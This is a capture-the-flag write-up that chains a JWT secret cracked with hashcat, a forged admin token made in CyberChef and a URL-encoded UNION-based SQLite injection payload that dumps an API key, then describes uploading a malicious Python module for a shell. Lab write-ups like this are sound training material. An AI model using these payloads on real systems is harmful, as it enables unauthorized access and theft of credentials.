After logging in with your new account, there's an "admin" check. A common key is used to sign JWTs here, you can crack it using hashcat.

```bash
$ hashcat 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImFkbWluIjpmYWxzZSwiZXhwIjoxNzU1OTYzMzYwfQ.y3Uas6j0NdRN0SSV9QrQxhxSz0C6-i57yny4AEyQjCA' /usr/share/wordlists/rockyou.txt
...[SNIP]...
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImFkbWluIjpmYWxzZSwiZXhwIjoxNzU1OTYzMzYwfQ.y3Uas6j0NdRN0SSV9QrQxhxSz0C6-i57yny4AEyQjCA:secretkey
```

Sign your own token with the admin claim set to true. [Cyberchef recipe here](https://gchq.github.io/CyberChef/#recipe=JWT_Sign('secretkey','HS256','%7B%5Cn%20%20%22alg%22:%20%22HS256%22,%5Cn%20%20%22typ%22:%20%22JWT%22%5Cn%7D')&input=ewogICJ1c2VyIjogInRlc3QiLAogICJhZG1pbiI6IHRydWUsCiAgImV4cCI6IDE3NTU5NjMzNjAKfQ)

Admin dashboard lets you search for users, and this API endpoint is vulnerable to SQL injection. After basic enum, you will know it's 4 columns, and is sqlite.

Now you might be wondering how to get RCE from sqlite 🤔  It's not possible without loaded extensions, or a file write primitive, even moreso because this is a python app.

There's a non-default table `settings` that gives us an API key.
```
'%20union%20SELECT%201%2Ckey%2Cvalue%2C4%20FROM%20settings%3B--
```
You can use the API key to upload a malicious python module to get a shell on the box. Swagger docs is enabled (/api/docs) which allows you to discover this endpoint.

Flag: `brunner{fr0nt_r0w_t1ck3ts_f0r_brunn3r_4nd_b455}`

Solved by: benkyou